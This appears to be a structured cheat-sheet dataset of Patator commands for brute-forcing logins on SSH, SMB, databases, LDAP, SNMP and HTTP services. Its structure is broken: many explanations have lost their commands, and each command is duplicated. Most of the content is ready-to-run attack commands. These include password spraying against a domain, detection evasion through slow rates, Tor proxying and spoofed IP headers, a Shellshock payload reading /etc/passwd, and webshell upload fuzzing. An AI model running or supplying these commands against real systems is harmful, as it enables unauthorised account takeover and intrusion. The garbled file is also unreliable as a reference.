description: Complete Patator command and workflow reference from basic to advanced credential testing

commands.explanation: Tests a single static username and password against a local SSH service.
Attempts a single credential pair authentication against an FTP server.
Validates a single credential set against a legacy Telnet service.
Iterates through a password file testing against the static user 'admin'.
Iterates through a username file testing against a static password.
Tests username as password (user=pass) by using the same file input for both fields.
Performs a standard brute-force attack trying every password for every user.
Uses the COMBO iterator to test combinations defined in a single file.
Generates a numeric range of years to test as passwords.
Uses an external script (PROG0) to dynamically generate payloads.

commands.command: patator http_fuzz url=http://127.0.0.1/protected/ method=GET auth_type=basic user=FILE0 0=users.txt password=FILE1 1=passwords.txt
commands.example: patator http_fuzz url=http://127.0.0.1/protected/ method=GET auth_type=basic user=FILE0 0=users.txt password=FILE1 1=passwords.txt
commands.explanation: Fuzzes HTTP Basic Authentication using lists for users and passwords.

commands.command: patator http_fuzz url=http://127.0.0.1/digest/ method=GET auth_type=digest user=admin password=FILE0 0=passwords.txt
commands.example: patator http_fuzz url=http://127.0.0.1/digest/ method=GET auth_type=digest user=admin password=FILE0 0=passwords.txt
commands.explanation: Tests HTTP Digest Authentication against a specific user.
Brute forces a standard HTML login form via POST request body.

commands.command: patator http_fuzz url=http://127.0.0.1/login method=POST body='{"user": "FILE0", "pass": "FILE1"}' header='Content-Type: application/json' 0=users.txt 1=pass.txt
commands.example: patator http_fuzz url=http://127.0.0.1/login method=POST body='{"user": "FILE0", "pass": "FILE1"}' header='Content-Type: application/json' 0=users.txt 1=pass.txt
commands.explanation: Tests a JSON API authentication endpoint by injecting payloads into a JSON body.

commands.command: patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:code=200
commands.example: patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:code=200
commands.explanation: Ignores responses with HTTP status code 200 to isolate anomalies.

commands.command: patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:size=1234
commands.example: patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:size=1234
commands.explanation: Ignores responses that match a specific byte size, common for standard failure pages.

commands.command: patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:fgrep='Invalid password'
commands.example: patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:fgrep='Invalid password'
commands.explanation: Ignores responses containing the specific string 'Invalid password'.
Tests SMB (Server Message Block) credentials against the Administrator account.

commands.command: patator smb_login host=127.0.0.1 user=FILE0 0=users.txt password=FILE1 1=passwords.txt domain=WORKGROUP
commands.example: patator smb_login host=127.0.0.1 user=FILE0 0=users.txt password=FILE1 1=passwords.txt domain=WORKGROUP
commands.explanation: Performs SMB login testing specifying a target domain.
Brute forces the root account on a MySQL database server.
Tests credentials against the SA account on a Microsoft SQL Server.

commands.command: patator postgres_login host=127.0.0.1 user=postgres password=FILE0 0=passwords.txt database=template1
commands.example: patator postgres_login host=127.0.0.1 user=postgres password=FILE0 0=passwords.txt database=template1
commands.explanation: Targets a specific PostgreSQL database instance for authentication.
Attempts to authenticate via RDP (Remote Desktop Protocol) using a password list.
Tests VNC passwords which typically do not require a username.
Validates credentials against an SMTP mail server.
Tests passwords against a POP3 email account.
Tests credentials against an IMAP service.
Brute forces SNMP community strings to identify management access.

commands.command: patator ldap_login host=127.0.0.1 base_dn='dc=example,dc=com' user=FILE0 0=users.txt password=FILE1 1=passwords.txt
commands.example: patator ldap_login host=127.0.0.1 base_dn='dc=example,dc=com' user=FILE0 0=users.txt password=FILE1 1=passwords.txt
commands.explanation: Tests LDAP directory credentials with a specified Base DN.
Attempts to crack the password of a protected ZIP file using a dictionary.
Runs the attack using 10 concurrent threads to increase speed.
Sets a 5-second timeout per connection to drop hanging attempts quickly.
Limits the attack speed to 1 request per second to evade detection.
Retries failed connections up to 3 times before giving up on a payload.
Sprays a single credential pair across an entire CIDR network range.
Performs a password spray attack testing one common password against many users.
Enables verbose mode to see detailed output of every attempt.

commands.command: patator http_fuzz url=http://127.0.0.1/admin method=GET header='Cookie: session_id=FILE0' 0=sessions.txt
commands.example: patator http_fuzz url=http://127.0.0.1/admin method=GET header='Cookie: session_id=FILE0' 0=sessions.txt
commands.explanation: Fuzzes the Cookie header to perform session hijacking or enumeration.

commands.command: patator http_fuzz url=http://127.0.0.1/ method=GET header='User-Agent: FILE0' 0=user_agents.txt
commands.example: patator http_fuzz url=http://127.0.0.1/ method=GET header='User-Agent: FILE0' 0=user_agents.txt
commands.explanation: Rotates User-Agent strings to bypass simple WAF rules.

commands.command: patator http_fuzz url=https://127.0.0.1/ method=GET --cert client.pem --key client.key
commands.example: patator http_fuzz url=https://127.0.0.1/ method=GET --cert client.pem --key client.key
commands.explanation: Uses client-side SSL certificates for mutual TLS authentication testing.
Routes traffic through a local proxy (like Burp Suite) for inspection.

commands.command: patator ssh_login host=1.2.3.4 user=admin password=pass proxy=socks5://127.0.0.1:9050
commands.example: patator ssh_login host=1.2.3.4 user=admin password=pass proxy=socks5://127.0.0.1:9050
commands.explanation: Routes SSH attacks through a SOCKS5 proxy (e.g., Tor).

commands.command: patator http_fuzz url=http://127.0.0.1/ method=GET user=FILE0 0=users.txt -x ignore:header='Location: /login'
commands.example: patator http_fuzz url=http://127.0.0.1/ method=GET user=FILE0 0=users.txt -x ignore:header='Location: /login'
commands.explanation: Ignores responses that redirect back to the login page.

commands.command: patator http_fuzz url=http://127.0.0.1/api method=POST body='token=FILE0' 0=tokens.txt -x quit:code=200
commands.example: patator http_fuzz url=http://127.0.0.1/api method=POST body='token=FILE0' 0=tokens.txt -x quit:code=200
commands.explanation: Stops the attack immediately upon receiving a 200 OK response.

commands.command: patator oracle_login host=127.0.0.1 sid=xe user=system password=FILE0 0=passwords.txt
commands.example: patator oracle_login host=127.0.0.1 sid=xe user=system password=FILE0 0=passwords.txt
commands.explanation: Attacks an Oracle Database SID with the system user.
Performs DNS subdomain brute forcing by iterating prefixes.
Iterates through DNS record types (A, MX, TXT) for a specific domain.
Tests a single credential pair against a list of different hosts.
Fuzzes two different parts of a URL path simultaneously.
Iterates through numeric IDs in the URL from 1000 to 2000.
Sets an extremely slow rate limit (1 request every 10 seconds) to avoid lockouts.

commands.command: patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -x quit:mesg='Last login'
commands.example: patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -x quit:mesg='Last login'
commands.explanation: Detects successful SSH login by matching the 'Last login' banner message.

commands.command: patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt > audit.log
commands.example: patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt > audit.log
commands.explanation: Redirects standard output to a log file for later analysis.
Resumes the attack starting from the 100th entry in the user list.
Injects XXE payloads into a POST body parameter.

commands.command: patator http_fuzz url=http://127.0.0.1/ method=GET header='X-Forwarded-For: FILE0' 0=ips.txt
commands.example: patator http_fuzz url=http://127.0.0.1/ method=GET header='X-Forwarded-For: FILE0' 0=ips.txt
commands.explanation: Fuzzes the X-Forwarded-For header to test for IP spoofing vulnerabilities.
Tests for Rlogin trust relationships without a password.
Enumerates available methods on a Java RMI registry.

commands.command: patator http_fuzz url=http://127.0.0.1/upload method=POST body='file=FILE0' 0=webshells.txt header='Content-Type: multipart/form-data'
commands.example: patator http_fuzz url=http://127.0.0.1/upload method=POST body='file=FILE0' 0=webshells.txt header='Content-Type: multipart/form-data'
commands.explanation: Fuzzes file upload endpoints with various malicious file contents.
Runs the module in interactive mode for debugging responses.
Uses HTTP Keep-Alive to reuse TCP connections and improve speed.
Uses a custom separator to parse user:pass combos from a single file properly.

commands.command: patator ldap_login host=127.0.0.1 base_dn='dc=lab' user=admin password=pass -v
commands.example: patator ldap_login host=127.0.0.1 base_dn='dc=lab' user=admin password=pass -v
commands.explanation: Verifies LDAP connectivity and credentials with verbose output.
Fast VNC password cracking with short timeouts.

commands.command:
patator telnet_login host=127.0.0.1 user=admin password=pass inputs='sh
exit
'
commands.example:
patator telnet_login host=127.0.0.1 user=admin password=pass inputs='sh
exit
'
commands.explanation: Sends additional inputs after login to verify shell access.

commands.command: patator smb_login host=10.0.0.5 user=FILE0 0=domain_users.txt password=Summer2023! domain=CORP
commands.example: patator smb_login host=10.0.0.5 user=FILE0 0=domain_users.txt password=Summer2023! domain=CORP
commands.explanation: Sprays a seasonal password against domain users on a domain controller.
Checks for default MySQL credentials across a subnet.

commands.command: patator http_fuzz url=http://127.0.0.1/api/v1/data method=GET header='Authorization: Bearer FILE0' 0=keys.txt -x ignore:code=401
commands.example: patator http_fuzz url=http://127.0.0.1/api/v1/data method=GET header='Authorization: Bearer FILE0' 0=keys.txt -x ignore:code=401
commands.explanation: Tests a list of Bearer tokens, ignoring unauthorized responses.
Checks for anonymous FTP access.

commands.command: patator http_fuzz url=http://127.0.0.1/login method=POST body='u=admin&p=FILE0' 0=pass.txt -x ignore:egrep='(Fail|Error|Deny)'
commands.example: patator http_fuzz url=http://127.0.0.1/login method=POST body='u=admin&p=FILE0' 0=pass.txt -x ignore:egrep='(Fail|Error|Deny)'
commands.explanation: Uses extended regex to ignore multiple failure keywords in responses.

commands.command: patator postgres_login host=127.0.0.1 user=postgres password=FILE0 0=pass.txt ssl=on
commands.example: patator postgres_login host=127.0.0.1 user=postgres password=FILE0 0=pass.txt ssl=on
commands.explanation: Enforces SSL encryption for PostgreSQL login attempts.

commands.command: patator http_fuzz url=http://127.0.0.1/ajax_check method=POST body='user=FILE0' 0=users.txt header='X-Requested-With: XMLHttpRequest'
commands.example: patator http_fuzz url=http://127.0.0.1/ajax_check method=POST body='user=FILE0' 0=users.txt header='X-Requested-With: XMLHttpRequest'
commands.explanation: Adds the AJAX header to properly test asynchronous endpoints.

commands.command: patator http_fuzz url=http://127.0.0.1/admin method=GET header='Cookie: admin=FILE0' 0=booleans.txt
commands.example: patator http_fuzz url=http://127.0.0.1/admin method=GET header='Cookie: admin=FILE0' 0=booleans.txt
commands.explanation: Fuzzes a boolean cookie value (true/false, 0/1) to bypass checks.
Iterates through a folder of private keys attempting public key authentication.

commands.command: patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt header='X-Originating-IP: 127.0.0.FILE1' 1=RANGE1 1=1-254
commands.example: patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt header='X-Originating-IP: 127.0.0.FILE1' 1=RANGE1 1=1-254
commands.explanation: Spoofs originating IP headers per request to bypass IP-based rate limiting.
Identifies blind SQL injection by filtering out responses that are faster than 5 seconds.
Tests for write permissions by attempting to PUT files on the server.
Tests for credentials where username and password are identical.
Aggressive parallel scanning with 50 threads and no retries.

commands.command: patator http_fuzz url=http://127.0.0.1/ method=POST body='A' header='Content-Length: FILE0' 0=integers.txt
commands.example: patator http_fuzz url=http://127.0.0.1/ method=POST body='A' header='Content-Length: FILE0' 0=integers.txt
commands.explanation: Fuzzes Content-Length header to test for Request Smuggling vulnerabilities.
Iterates HTTP methods (GET, POST, PUT, DELETE) to find allowed verbs.

commands.command: patator snmp_login host=127.0.0.1 version=2c community=FILE0 0=communities.txt access=write
commands.example: patator snmp_login host=127.0.0.1 version=2c community=FILE0 0=communities.txt access=write
commands.explanation: Specifically hunts for write-capable SNMP community strings.

commands.command: patator http_fuzz url=http://127.0.0.1/ method=GET header='Shellshock: () { :;}; echo; /bin/cat /etc/passwd' -x ignore:size=0
commands.example: patator http_fuzz url=http://127.0.0.1/ method=GET header='Shellshock: () { :;}; echo; /bin/cat /etc/passwd' -x ignore:size=0
commands.explanation: Injects a Shellshock payload into a custom header and looks for output.
Parses a CSV file where user and password are in the same line separated by a comma.
Uses the VRFY command to valid existing users without logging in.

commands.command: patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -x ignore:code=fail > valid_ssh.txt
commands.example: patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -x ignore:code=fail > valid_ssh.txt
commands.explanation: Automates the attack and saves only valid credentials to a file.
Targets a service running on the IPv6 localhost address.
Runs with debug logging enabled to troubleshoot module errors.
Floods authentication requests to verify if SIEM alerts trigger correctly.

commands.command: patator http_fuzz url=http://127.0.0.1/ method=GET header='User-Agent: sqlmap' -x quit:code=403
commands.example: patator http_fuzz url=http://127.0.0.1/ method=GET header='User-Agent: sqlmap' -x quit:code=403
commands.explanation: Tests if the WAF correctly blocks known malicious User-Agents.
Simple directory brute forcing by ignoring Not Found errors.
Injects fuzzing payloads into the username field of Telnet.
Checks for guest account access on MSSQL.
Checks for unauthenticated access to Elasticsearch indices.
Tests admin credentials against a MongoDB instance.
Brute forces the Redis requirepass directive.

commands.command: patator http_fuzz url=http://127.0.0.1/ method=GET header='Host: FILE0.example.com' 0=subs.txt -x ignore:size=default_size
commands.example: patator http_fuzz url=http://127.0.0.1/ method=GET header='Host: FILE0.example.com' 0=subs.txt -x ignore:size=default_size
commands.explanation: Fuzzes the Host header to discover internal virtual hosts.
Tests for HTTP Parameter Pollution by injecting duplicate parameters.
Checks for accessible Git repository objects on a web server.
Final low-timeout check to ensure service is still responsive.
